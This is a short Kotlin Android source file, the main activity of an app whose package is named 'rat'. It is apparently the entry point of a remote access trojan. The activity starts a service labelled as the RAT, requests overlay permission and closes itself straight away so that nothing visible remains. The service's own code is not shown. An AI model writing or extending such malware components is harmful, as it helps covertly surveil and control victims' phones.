package com.fox.rat

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Start the RAT service
        val serviceIntent = Intent(this, RatService::class.java)
        startForegroundService(serviceIntent)

        // Request overlay permission if not granted
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION
            )
            startActivity(intent)
        }

        finish()
    }
}
